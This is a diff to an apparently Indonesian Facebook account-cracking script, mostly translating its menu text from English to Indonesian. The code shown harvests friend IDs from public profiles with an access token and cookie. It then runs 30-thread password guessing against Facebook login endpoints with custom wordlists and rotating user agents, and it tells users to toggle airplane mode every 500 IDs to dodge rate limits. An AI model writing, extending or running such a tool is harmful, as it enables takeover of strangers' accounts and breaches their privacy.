@@ -255,7 +255,7 @@ def menu(my_name,my_id):
 	print('%s[%s03%s] %s\033[32mJOIN GRUP WA%s'%(P,P,P,P,P));time.sleep(0.02)
 	print('%s[%s04%s] %s\033[95mCHAT ADMIN%s'%(P,P,P,P,P));time.sleep(0.02)
 	print('%s[%s06%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
-	jh = input(P+'['+P+'â—'+P+']  MENU  ')
+	jh = input(P+'['+P+'PILIH'+P+']  MENU :  ')
 	if jh in ['1','01']:
 		dump_publik()
 	elif jh in ['2','02']:
@@ -268,7 +268,7 @@ def menu(my_name,my_id):
 		os.system("rm -f .cok.txt")
 		print(h+'  ['+h+'â—'+h+']  HOLDâ—â—â—')
 		time.sleep(1)
-		print('# EXIT SUCCESSFULLY')
+		print('# BERHASIL KELUAR')
 		exit()
 	else:
 		print('# RETURN BACK TO MENU')
@@ -281,8 +281,8 @@ def dump_publik():
 	except IOError:
 		exit()
 	linex()
-	print(P+'['+P+'●'+P+'] ID HARUS PUBLIK!')
-	pil = input(P+'['+P+'●'+P+'] MASUKKAN ID: ')
+	print(P+'['+P+'•'+P+'] ID HARUS PUBLIK!')
+	pil = input(P+'['+P+'•'+P+'] MASUKKAN ID: ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
 		for pi in koh2['friends']['data']:
@@ -294,7 +294,7 @@ def dump_publik():
 		print('# BAD INTERNET CONNECTION')
 		exit()
 	except (KeyError,IOError):
-		print('# WRONG ID NUMBER')
+		print('# ID TIDAK PUBLIK/AKUN CP')
 		exit()
 
 def multidump():
@@ -316,9 +316,9 @@ def multidump():
 				try:id.append(pi['id']+'|'+pi['name'])
 				except:continue
 		except requests.exceptions.ConnectionError:
-			print('[×] BAD INTERNET CONNECTION! ')
+			print('[×] TIDAK ADA KONEKSI INTERNET! ')
 		except (KeyError,IOError):
-			print('\n [×] ERROR RETRIEVING ID, PROBABLY ID IS NOT FOUND');multidump()
+			print('\n [×] ID TIDAK PUBLIK / AKUN CP');multidump()
 	print()
 	print(P+'['+P+'•'+P+'] TOTAL : '+str(len(id)))
 	setting()
@@ -326,12 +326,12 @@ def multidump():
 
 # PENGATURAN ID
 def setting():
-	wl = '# ID SEQUENCE SETTINGS'
+	wl = '# PENGATURAN ID'
 	sol().print(mark(wl, style='green'))
-	teks = '[01] CRACK FROM THE OLDEST ACCOUNT(\x1b[1;91mNot Recomended)\n[02] CRACK FROM THE YOUNGEST ACCOUNT(\033[32mRecomended)\n[03] CRACK RANDOM ID(\033[32mSangad Recomended)'
+	teks = '[01] CRACK AKUN TERTUA (\x1b[1;91mNot Recomended)\n[02] CRACK AKUN TERMUDA (\033[32mRecomended)\n[03] CRACK RANDOM (\033[32mSangad Recomended)'
 	tak = nel(teks, style='cyan')
-	cetak(nel(tak, title=' • SETTING • '))
-	hu = input(x+'['+p+'f'+x+'] Choose : ')
+	cetak(nel(tak, title=' • PENGATURAN CRACK ID • '))
+	hu = input(x+'['+p+'f'+x+'] Pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -353,11 +353,11 @@ def setting():
 		ric = '# OPTION NOT IN THE MENU'
 		sol().print(mark(ric, style='red'))
 		exit()
-	met = '# CHOOSE CRACK METHOD'
+	met = '# METHODE CRACK'
 	sol().print(mark(met, style='green'))
-	ioz = '[01]M-PRO\n[02]B-PRO'
+	ioz = '[01]MBASIC.FACEBOOK.COM\n[02]B-PRO'
 	gess = nel(ioz, style='cyan')
-	cetak(nel(gess, title=' • METHOD • '))
+	cetak(nel(gess, title=' • METHODE • '))
 	hc = input(x+'['+p+'f'+x+']  : ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -366,14 +366,14 @@ def setting():
 	else:
 		method.append('mobile')
 		
-	guw = '# WANT TO USE ADDITIONAL PASSWORD ? (y/t)'
+	guw = '# INGIN MENAMBAHKAN SANDI MANUAL ? (y/t)'
 	sol().print(mark(guw, style='cyan'))
-	pwplus=input(x+'['+p+'f'+x+'] Choose : ')
+	pwplus=input(x+'['+p+'f'+x+'] Pilih : ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: indonesia,germany,bangladesh'
-		cetak(nel(krek, title=' • ADDITIONAL PASSWORD • '))
-		pwku=input('ENTER ADDITIONAL PASSWORD : ')
+		krek = '[•] GUNAKAN KOMA UNTUK PEMISAH\n[•] !!\n[•] CONTOH: indonesia,germany,bangladesh'
+		cetak(nel(krek, title=' • PASSWORD MANUAL • '))
+		pwku=input('MASUKAN PASSWORD MANUAL : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -383,10 +383,10 @@ def setting():
 
 # WORDLIST
 def passwrd():
-	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
+	ler = '# CRACK DIMULAI, TEKAN CTRL+Z UNTUK KELUAR'
 	sol().print(mark(ler, style='green'))
-	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/V7-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/V7-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
-	cetak(nel(krek, title=' • CRACK • '))
+	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/V7-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/V7-DATA/CP/%s\nMATIKAN DAN HIDUPKAN MODE PESAWAT SETIAP 500 ID!!'%(okc,cpc)
+	cetak(nel(krek, title=' • CRACK PROSES • '))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -422,9 +422,9 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	tanya = '# WANT TO SHOW CHECKPOINT OPTIONS ? (y/t)'
+	tanya = '# TAMPILKAN OPSI CP ? (y/t)'
 	sol().print(mark(tanya, style='green'))
-	woi = input(x+'[•] Choose : ')
+	woi = input(x+'[•] Pilih : ')
 	if woi in ['y','Y']:
 		cek_opsi()
 	else:
@@ -433,7 +433,7 @@ def passwrd():
 # CRACKER
 def crack(idf,pwv):
 	global loop,ok
-	sys.stdout.write(f"\r [●] {P}[{P}{loop}{P}/{P}{len(id)}{P}] {P}[{H}{ok}{P}] {P}[{M}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r [•] {P}[{P}{loop}{P}/{P}{len(id)}{P}] {P}[{H}{ok}{P}] {P}[{M}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
